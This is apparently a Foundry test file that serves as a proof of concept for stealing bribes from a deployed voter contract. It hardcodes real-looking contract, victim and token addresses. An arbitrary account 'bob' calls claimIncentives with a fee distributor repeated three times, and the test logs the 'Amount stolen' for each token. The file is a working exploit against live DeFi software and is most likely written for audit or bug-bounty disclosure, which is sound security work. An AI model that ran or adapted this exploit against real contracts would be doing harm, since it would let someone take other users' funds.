pragma solidity ^0.8.x;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IVoter} from "contracts/VoteModule.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract StealBribesTest is Test {
    address public VOTER = 0x3aF1dD7A2755201F8e2D6dCDA1a61d9f54838f4f;
    address public VICTIM = 0xB3bfB32977cFd6200AB9537E3703e501d8381c9B;

    function setUp() public {}

    function test_stealBribes() public {
        address[] memory feeDistributors = new address[](3);
        feeDistributors[0] = 0xB952D1db74A4bB9d97c26b2fCf110E10B70811a1;
        feeDistributors[1] = 0xB952D1db74A4bB9d97c26b2fCf110E10B70811a1;
        feeDistributors[2] = 0xB952D1db74A4bB9d97c26b2fCf110E10B70811a1;

        address[][] memory tokens = new address[][](3);
        for (uint256 i = 0; i < 3; i++) {
            tokens[i] = new address[](4);
            tokens[i][0] = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
            tokens[i][1] = 0x3333b97138D4b086720b5aE8A7844b1345a33333;
            tokens[i][2] = 0x5050bc082FF4A74Fb6B0B04385dEfdDB114b2424;
            tokens[i][3] = 0xF19748a0E269c6965a84f8C98ca8C47A064D4dd0;
        }

        address bob = makeAddr("bob");

        // Store initial balances
        uint256[] memory initialBalances = new uint256[](4);
        for (uint256 i = 0; i < 4; i++) {
            initialBalances[i] = IERC20(tokens[0][i]).balanceOf(bob);
        }

        vm.startPrank(bob);
        IVoter(VOTER).claimIncentives(bob, feeDistributors, tokens);

        // check final balances and log the stolen amounts
        console.log("=== Bribes stolen by Bob ===");
        for (uint256 i = 0; i < 4; i++) {
            uint256 finalBalance = IERC20(tokens[0][i]).balanceOf(bob);
            uint256 stolenAmount = finalBalance - initialBalances[i];
            console.log("Token", i, ":", tokens[0][i]);
            console.log("Amount stolen:", stolenAmount);
        }
    }
}
